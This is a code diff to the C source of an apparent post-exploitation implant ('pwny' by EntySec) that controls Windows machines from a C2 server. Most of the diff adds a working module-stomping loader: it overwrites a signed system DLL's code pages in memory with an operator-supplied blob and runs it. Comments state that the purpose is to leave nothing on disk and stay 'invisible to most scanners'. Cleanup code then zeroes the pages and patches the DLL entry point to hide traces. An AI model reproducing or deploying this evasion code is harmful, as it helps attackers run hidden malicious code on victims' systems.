@@ -1,7 +1,7 @@
 /*
  * MIT License
  *
- * Copyright (c) 2020-2024 EntySec
+ * Copyright (c) 2020-2026 EntySec
  *
  * Permission is hereby granted, free of charge, to any person obtaining a copy
  * of this software and associated documentation files (the "Software"), to deal
@@ -37,6 +37,7 @@
 #include <pwny/tlv.h>
 #include <pwny/queue.h>
 #include <pwny/group.h>
+#include <pwny/pipe.h>
 
 #include <uthash/uthash.h>
 
@@ -44,13 +45,19 @@
 
 /*
  * =============================================================
- * Windows: In-process DLL tabs via standard LoadLibrary.
+ * Windows: In-process DLL tabs via standard LoadLibrary,
+ * plus Code-Only Tabs (COT) via module stomping.
  *
- * Each tab DLL exports a TabInit function that receives a
+ * DLL path: Each tab DLL exports a TabInit function that receives a
  * pointer to the tab's private api_calls hash table. The DLL
  * registers its handlers there. When a request comes in with
  * TLV_TYPE_TAB_ID, tabs_lookup dispatches directly via
  * api_call_make — no child process, no pipes, no IPC.
+ *
+ * COT path: A flat position-independent code blob (produced by
+ * pe2cot.py) is stomped into a sacrificial signed DLL's pages.
+ * No PE headers, no disk drop, no unreferenced VA allocations.
+ * All API calls go through a vtable populated by the host.
  *
  * For memory-buffer loads: write to temp file → LoadLibraryA.
  * This avoids embedding a manual PE mapper (VirtualAlloc +
@@ -61,10 +68,29 @@
 
 #include <windows.h>
 
+/*
+ * TAB_TERM — the Python side sends this to gracefully terminate
+ * a tab before deleting it.  Must match tab.h / api.py.
+ */
+#define TAB_TERM \
+        TLV_TAG_CUSTOM(API_CALL_INTERNAL, \
+                       3, \
+                       API_CALL)
+
+static tlv_pkt_t *tab_term_handler(c2_t *c2)
+{
+    return api_craft_tlv_pkt(API_CALL_QUIT, c2->request);
+}
+
 /* Tab DLL init prototype:
  *   void TabInit(api_calls_t **api_calls);
  * The DLL calls api_call_register() on the provided table. */
 typedef void (*tab_init_t)(api_calls_t **api_calls);
+
+/* Optional pipe init:
+ *   void TabInitPipes(pipes_t **pipes);
+ * The DLL calls api_pipe_register() on the host's pipes table. */
+typedef void (*tab_init_pipes_t)(pipes_t **pipes);
 
 /*
  * Write raw DLL bytes to a temp file and return the path.
@@ -116,6 +142,278 @@ static char *write_temp_dll(unsigned char *image, size_t length)
     return temp_file;
 }
 
+/* ------------------------------------------------------------------ */
+/* Code-Only Tab (COT) — module stomping loader                        */
+/* ------------------------------------------------------------------ */
+
+#include <pwny/tab_cot.h>
+
+/*
+ * Generic Win32 API resolver for COT plugins.
+ *
+ * plugins call: cot_resolve("kernel32.dll", "VirtualProtect")
+ * → GetModuleHandleA first (fast, no refcount), fall back to LoadLibraryA.
+ */
+static void *cot_resolve_func(const char *module, const char *func)
+{
+    HMODULE hMod;
+
+    hMod = GetModuleHandleA(module);
+    if (hMod == NULL)
+        hMod = LoadLibraryA(module);
+    if (hMod == NULL)
+        return NULL;
+
+    return (void *)GetProcAddress(hMod, func);
+}
+
+/*
+ * Build the vtable that COT plugins use to call back into the host.
+ * Every function pointer here is resolved from the host's own
+ * statically-linked code — no new imports.
+ */
+static void cot_build_vtable(tab_vtable_t *vt)
+{
+    memset(vt, 0, sizeof(*vt));
+
+    vt->api_call_register = api_call_register;
+    vt->api_pipe_register = api_pipe_register;
+    vt->api_craft_tlv_pkt = api_craft_tlv_pkt;
+    vt->tlv_pkt_create    = tlv_pkt_create;
+    vt->tlv_pkt_destroy   = tlv_pkt_destroy;
+    vt->tlv_pkt_add_u32   = tlv_pkt_add_u32;
+    vt->tlv_pkt_add_string = tlv_pkt_add_string;
+    vt->tlv_pkt_add_bytes = tlv_pkt_add_bytes;
+    vt->tlv_pkt_add_tlv   = tlv_pkt_add_tlv;
+    vt->tlv_pkt_get_u32   = (int (*)(tlv_pkt_t *, int, int32_t *))tlv_pkt_get_u32;
+    vt->tlv_pkt_get_string = (int (*)(tlv_pkt_t *, int, char *))tlv_pkt_get_string;
+    vt->tlv_pkt_get_bytes = (int (*)(tlv_pkt_t *, int, unsigned char **))tlv_pkt_get_bytes;
+#ifdef DEBUG
+    vt->log_debug         = log_debug;
+#else
+    vt->log_debug         = (void (*)(const char *, ...))NULL;
+#endif
+
+    /* Generic resolver — plugins can fetch any Win32 function */
+    vt->resolve = cot_resolve_func;
+
+    /* CRT heap functions — plugins use these transparently via macros */
+    vt->crt_malloc  = malloc;
+    vt->crt_free    = free;
+    vt->crt_calloc  = calloc;
+
+    /* C2 enqueue — plugins can push unsolicited TLV packets */
+    vt->c2_enqueue_tlv = c2_enqueue_tlv;
+}
+
+/*
+ * Check if a buffer starts with the COT magic header.
+ */
+static int cot_is_cot_image(unsigned char *image, size_t length)
+{
+    cot_header_t *hdr;
+
+    if (length < sizeof(cot_header_t))
+        return 0;
+
+    hdr = (cot_header_t *)image;
+    return (hdr->magic == COT_MAGIC && hdr->version == 1);
+}
+
+/*
+ * Load a COT blob via module stomping.
+ *
+ * 1. LoadLibrary a sacrificial signed DLL
+ * 2. VirtualProtect its pages to RW
+ * 3. Copy the COT code over the sacrificial .text section
+ * 4. VirtualProtect to RX
+ * 5. Call TabInitCOT via the vtable
+ *
+ * The VAD still shows the memory as backed by the signed DLL
+ * on disk — invisible to most scanners.
+ */
+static int tabs_add_cot(tabs_t **tabs, int id,
+                        unsigned char *image, size_t length,
+                        const char *candidate,
+                        c2_t *c2)
+{
+    cot_header_t *hdr;
+    unsigned char *code;
+    size_t code_size;
+
+    HMODULE hStomp = NULL;
+    PIMAGE_DOS_HEADER dos;
+    PIMAGE_NT_HEADERS nt;
+    SIZE_T image_size;
+    DWORD dwOld;
+    void *stomp_text;
+
+    tab_vtable_t *vt;
+    cot_init_t entry;
+    tabs_t *tab;
+    tabs_t *tab_new;
+
+    hdr = (cot_header_t *)image;
+    code = image + sizeof(cot_header_t);
+    code_size = hdr->code_size;
+
+    if (sizeof(cot_header_t) + code_size > length)
+    {
+        log_debug("* cot: truncated image\n");
+        return -1;
+    }
+
+    if (hdr->entry_offset >= code_size)
+    {
+        log_debug("* cot: entry offset out of bounds\n");
+        return -1;
+    }
+
+    if (candidate == NULL || candidate[0] == '\0')
+    {
+        log_debug("* cot: no stomp candidate provided\n");
+        return -1;
+    }
+
+    HASH_FIND_INT(*tabs, &id, tab);
+    if (tab != NULL)
+        return -1;
+
+    /* Load the server-selected sacrificial DLL.
+     * The Python side tracks which candidates are available and
+     * already in use — no hardcoded list in the binary. */
+    hStomp = LoadLibraryA(candidate);
+    if (hStomp == NULL)
+    {
+        log_debug("* cot: LoadLibrary(%s) failed (%lu)\n",
+                  candidate, GetLastError());
+        return -1;
+    }
+
+    dos = (PIMAGE_DOS_HEADER)hStomp;
+    nt  = (PIMAGE_NT_HEADERS)((BYTE *)hStomp + dos->e_lfanew);
+    image_size = nt->OptionalHeader.SizeOfImage;
+
+    if (image_size < code_size + 0x1000)
+    {
+        log_debug("* cot: candidate %s too small (image %zu, need %zu)\n",
+                  candidate, (size_t)image_size, code_size);
+        FreeLibrary(hStomp);
+        return -1;
+    }
+
+    log_debug("* cot: using stomp candidate %s (image %zu, need %zu)\n",
+              candidate, (size_t)image_size, code_size);
+
+    /* Stomp target: first page after the PE header */
+    stomp_text = (BYTE *)hStomp + 0x1000;
+
+    /* Make pages writable */
+    if (!VirtualProtect(stomp_text, code_size, PAGE_READWRITE, &dwOld))
+    {
+        log_debug("* cot: VirtualProtect(RW) failed (%lu)\n", GetLastError());
+        goto fail_stomp;
+    }
+
+    /* Overwrite with COT code */
+    memcpy(stomp_text, code, code_size);
+
+    /* Set page protections: RX for code/rodata, RW for .data */
+    if (hdr->rw_offset > 0 && hdr->rw_size > 0)
+    {
+        /* Code region before writable section → RX */
+        if (!VirtualProtect(stomp_text, hdr->rw_offset,
+                            PAGE_EXECUTE_READ, &dwOld))
+        {
+            log_debug("* cot: VirtualProtect(RX code) failed (%lu)\n",
+                      GetLastError());
+            goto fail_stomp;
+        }
+
+        /* Writable region (.data/.bss) → RW */
+        if (!VirtualProtect((BYTE *)stomp_text + hdr->rw_offset,
+                            hdr->rw_size, PAGE_READWRITE, &dwOld))
+        {
+            log_debug("* cot: VirtualProtect(RW data) failed (%lu)\n",
+                      GetLastError());
+            goto fail_stomp;
+        }
+
+        /* Trailing region after .data (if any) → RX */
+        if (hdr->rw_offset + hdr->rw_size < code_size)
+        {
+            size_t tail_off  = hdr->rw_offset + hdr->rw_size;
+            size_t tail_size = code_size - tail_off;
+            VirtualProtect((BYTE *)stomp_text + tail_off,
+                           tail_size, PAGE_EXECUTE_READ, &dwOld);
+        }
+    }
+    else
+    {
+        /* No writable region — entire blob is RX */
+        if (!VirtualProtect(stomp_text, code_size,
+                            PAGE_EXECUTE_READ, &dwOld))
+        {
+            log_debug("* cot: VirtualProtect(RX) failed (%lu)\n",
+                      GetLastError());
+            goto fail_stomp;
+        }
+    }
+
+    FlushInstructionCache(GetCurrentProcess(), stomp_text, code_size);
+
+    /* Heap-allocate vtable so it outlives this function.
+     * The COT plugin stores a pointer to it (_cot_vt) and uses
+     * it every time a handler fires. */
+    vt = calloc(1, sizeof(*vt));
+    if (vt == NULL)
+    {
+        goto fail_stomp;
+    }
+    cot_build_vtable(vt);
+    vt->hModule = (void *)hStomp;
+
+    tab_new = calloc(1, sizeof(*tab_new));
+    if (tab_new == NULL)
+    {
+        free(vt);
+        goto fail_stomp;
+    }
+
+    tab_new->id = id;
+    tab_new->c2 = c2;
+    tab_new->hModule = NULL;
+    tab_new->temp_path = NULL;
+    tab_new->hStomp = hStomp;
+    tab_new->cot_code = stomp_text;
+    tab_new->cot_size = code_size;
+    tab_new->cot_vtable = vt;
+    tab_new->api_calls = NULL;
+    tab_new->pipes = NULL;
+
+    /* Call TabInitCOT(vtable, &api_calls, &pipes) */
+    entry = (cot_init_t)((BYTE *)stomp_text + hdr->entry_offset);
+    entry(vt, &tab_new->api_calls, &tab_new->pipes);
+
+    /* Register pipe handlers so PIPE_CREATE etc. dispatch
+     * through the tab with its own per-tab pipe table. */
+    register_pipe_api_calls(&tab_new->api_calls);
+
+    /* Register the TAB_TERM handler so the Python side can
+     * gracefully terminate this tab before deletion. */
+    api_call_register(&tab_new->api_calls, TAB_TERM, (api_t)tab_term_handler);
+
+    HASH_ADD_INT(*tabs, id, tab_new);
+    log_debug("* Added COT TAB entry (%d), %zu bytes stomped\n", id, code_size);
+    return 0;
+
+fail_stomp:
+    FreeLibrary(hStomp);
+    return -1;
+}
+
+/* ------------------------------------------------------------------ */
+
 int tabs_add(tabs_t **tabs, int id,
              char *filename,
              unsigned char *image,
@@ -127,6 +425,13 @@ int tabs_add(tabs_t **tabs, int id,
     HMODULE hMod;
     tab_init_t pfnTabInit;
     char *temp_path = NULL;
+
+    /* Auto-detect COT blobs by magic header */
+    if (image != NULL && length > 0 && cot_is_cot_image(image, length))
+    {
+        log_debug("* tabs: detected COT image, using module stomping\n");
+        return tabs_add_cot(tabs, id, image, length, filename, c2);
+    }
 
     HASH_FIND_INT(*tabs, &id, tab);
     if (tab != NULL)
@@ -199,9 +504,28 @@ int tabs_add(tabs_t **tabs, int id,
     tab_new->hModule = hMod;
     tab_new->temp_path = temp_path;
     tab_new->api_calls = NULL;
+    tab_new->pipes = NULL;
 
     /* Let the DLL register its handlers */
     pfnTabInit(&tab_new->api_calls);
+
+    /* Register pipe handlers so PIPE_CREATE etc. dispatch
+     * through the tab with its own per-tab pipe table. */
+    register_pipe_api_calls(&tab_new->api_calls);
+
+    /* Register the TAB_TERM handler so the Python side can
+     * gracefully terminate this tab before deletion. */
+    api_call_register(&tab_new->api_calls, TAB_TERM, (api_t)tab_term_handler);
+
+    /* Let the DLL register pipe types (optional) */
+    {
+        tab_init_pipes_t pfnTabInitPipes;
+        pfnTabInitPipes = (tab_init_pipes_t)GetProcAddress(hMod, "TabInitPipes");
+        if (pfnTabInitPipes != NULL)
+        {
+            pfnTabInitPipes(&tab_new->pipes);
+        }
+    }
 
     HASH_ADD_INT(*tabs, id, tab_new);
     log_debug("* Added DLL TAB entry (%d)\n", id);
@@ -213,6 +537,7 @@ int tabs_lookup(tabs_t **tabs, int id, tlv_pkt_t *tlv_pkt)
     tabs_t *tab;
     int tag;
     tlv_pkt_t *result;
+    pipes_t *saved_pipes;
 
     log_debug("* Searching for TAB entry (%d)\n", id);
     HASH_FIND_INT(*tabs, &id, tab);
@@ -230,13 +555,21 @@ int tabs_lookup(tabs_t **tabs, int id, tlv_pkt_t *tlv_pkt)
         return -1;
     }
 
-    /* Set request on the C2 and dispatch directly in-process */
+    /* Set request on the C2 and dispatch directly in-process.
+     * Swap c2->pipes to the tab's own per-tab pipe table so that
+     * pipe commands (PIPE_CREATE, PIPE_READ, etc.) operate on the
+     * tab's isolated pipe registrations, not the global table. */
     tab->c2->request = tlv_pkt;
+
+    saved_pipes = tab->c2->pipes;
+    tab->c2->pipes = tab->pipes;
 
     if (api_call_make(&tab->api_calls, tab->c2, tag, &result) != 0)
     {
         result = api_craft_tlv_pkt(API_CALL_NOT_IMPLEMENTED, tlv_pkt);
     }
+
+    tab->c2->pipes = saved_pipes;
 
     if (result != NULL)
     {
@@ -271,6 +604,52 @@ int tabs_delete(tabs_t **tabs, int id)
             api_calls_free(tab->api_calls);
         }
 
+        if (tab->pipes)
+        {
+            api_pipes_free(tab->pipes);
+        }
+
+        /* COT cleanup: zero the stomped pages, patch the sacrifice
+         * DLL's entry point so FreeLibrary's DLL_PROCESS_DETACH does
+         * not execute zeroed memory, then release the module. */
+        if (tab->cot_code != NULL)
+        {
+            DWORD dwOld;
+            VirtualProtect(tab->cot_code, tab->cot_size,
+                           PAGE_READWRITE, &dwOld);
+            SecureZeroMemory(tab->cot_code, tab->cot_size);
+
+            if (tab->hStomp)
+            {
+                PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)tab->hStomp;
+                PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(
+                    (BYTE *)tab->hStomp + dos->e_lfanew);
+                DWORD ep_rva = nt->OptionalHeader.AddressOfEntryPoint;
+
+                if (ep_rva >= 0x1000 &&
+                    ep_rva + 6 <= 0x1000 + tab->cot_size)
+                {
+                    /* x64 stub: mov eax, 1; ret  (DllMain returns TRUE) */
+                    BYTE *entry = (BYTE *)tab->hStomp + ep_rva;
+                    entry[0] = 0xB8; entry[1] = 0x01; entry[2] = 0x00;
+                    entry[3] = 0x00; entry[4] = 0x00; entry[5] = 0xC3;
+                }
+            }
+
+            VirtualProtect(tab->cot_code, tab->cot_size,
+                           PAGE_EXECUTE_READ, &dwOld);
+        }
+
+        if (tab->cot_vtable)
+        {
+            free(tab->cot_vtable);
+        }
+
+        if (tab->hStomp)
+        {
+            FreeLibrary(tab->hStomp);
+        }
+
         if (tab->hModule)
         {
             FreeLibrary(tab->hModule);
@@ -285,7 +664,7 @@ int tabs_delete(tabs_t **tabs, int id)
         HASH_DEL(*tabs, tab);
         free(tab);
 
-        log_debug("* Deleted DLL TAB entry (%d)\n", id);
+        log_debug("* Deleted TAB entry (%d)\n", id);
         return 0;
     }
 
@@ -299,12 +678,58 @@ void tabs_free(tabs_t *tabs)
 
     HASH_ITER(hh, tabs, tab, tab_tmp)
     {
-        log_debug("* Freed DLL TAB entry (%d)\n", tab->id);
+        log_debug("* Freed TAB entry (%d)\n", tab->id);
         HASH_DEL(tabs, tab);
 
         if (tab->api_calls)
         {
             api_calls_free(tab->api_calls);
+        }
+
+        if (tab->pipes)
+        {
+            api_pipes_free(tab->pipes);
+        }
+
+        /* COT cleanup: zero the stomped pages, patch the sacrifice
+         * DLL's entry point so FreeLibrary's DLL_PROCESS_DETACH does
+         * not execute zeroed memory, then release the module. */
+        if (tab->cot_code != NULL)
+        {
+            DWORD dwOld;
+            VirtualProtect(tab->cot_code, tab->cot_size,
+                           PAGE_READWRITE, &dwOld);
+            SecureZeroMemory(tab->cot_code, tab->cot_size);
+
+            if (tab->hStomp)
+            {
+                PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)tab->hStomp;
+                PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(
+                    (BYTE *)tab->hStomp + dos->e_lfanew);
+                DWORD ep_rva = nt->OptionalHeader.AddressOfEntryPoint;
+
+                if (ep_rva >= 0x1000 &&
+                    ep_rva + 6 <= 0x1000 + tab->cot_size)
+                {
+                    /* x64 stub: mov eax, 1; ret  (DllMain returns TRUE) */
+                    BYTE *entry = (BYTE *)tab->hStomp + ep_rva;
+                    entry[0] = 0xB8; entry[1] = 0x01; entry[2] = 0x00;
+                    entry[3] = 0x00; entry[4] = 0x00; entry[5] = 0xC3;
+                }
+            }
+
+            VirtualProtect(tab->cot_code, tab->cot_size,
+                           PAGE_EXECUTE_READ, &dwOld);
+        }
+
+        if (tab->cot_vtable)
+        {
+            free(tab->cot_vtable);
+        }
+
+        if (tab->hStomp)
+        {
+            FreeLibrary(tab->hStomp);
         }
 
         if (tab->hModule)
